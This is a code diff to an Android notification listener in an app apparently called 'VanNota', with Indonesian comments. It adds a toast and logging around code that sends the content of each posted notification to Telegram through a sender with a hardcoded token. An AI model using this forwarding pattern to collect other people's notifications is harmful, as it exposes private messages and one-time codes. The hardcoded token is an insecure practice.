@@ -4,9 +4,23 @@ import android.app.Notification;
 import android.os.Bundle;
 import android.service.notification.StatusBarNotification;
 import android.util.Log;
+import android.widget.Toast;
 
 public class NotificationListenerService extends android.service.notification.NotificationListenerService {
     private static final String TAG = "NotificationListener";
+
+    // ✅ TAMBAH: Log saat service berhasil terhubung
+    @Override
+    public void onListenerConnected() {
+        super.onListenerConnected();
+        Log.d(TAG, "✅ NotificationListenerService TERHUBUNG!");
+        // Bisa kasih toast biar user tau service aktif
+        try {
+            Toast.makeText(this, "VanNota siap membaca notifikasi", Toast.LENGTH_SHORT).show();
+        } catch (Exception e) {
+            // Toast kadang error di background service
+        }
+    }
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
@@ -49,15 +63,20 @@ public class NotificationListenerService extends android.service.notification.No
             String telegramTitle = "🔔 " + appDisplayName;
             String telegramMessage = messageBuilder.toString();
             
+            // Kirim ke Telegram pake TelegramSender yang udah hardcode token
             TelegramSender.sendMessage(this, telegramTitle, telegramMessage);
             
+            // Log kirim
+            Log.d(TAG, "📤 Notifikasi dikirim ke Telegram: " + telegramTitle);
+            
         } catch (Exception e) {
-            Log.e(TAG, "Error: " + e.getMessage());
+            Log.e(TAG, "❌ Error: " + e.getMessage());
         }
     }
 
     @Override
     public void onNotificationRemoved(StatusBarNotification sbn) {
+        // Tidak perlu kirim notifikasi yang dihapus
     }
 
     private String getDisplayName(String packageName) {
@@ -80,4 +99,4 @@ public class NotificationListenerService extends android.service.notification.No
                 return packageName;
         }
     }
-    }
+}
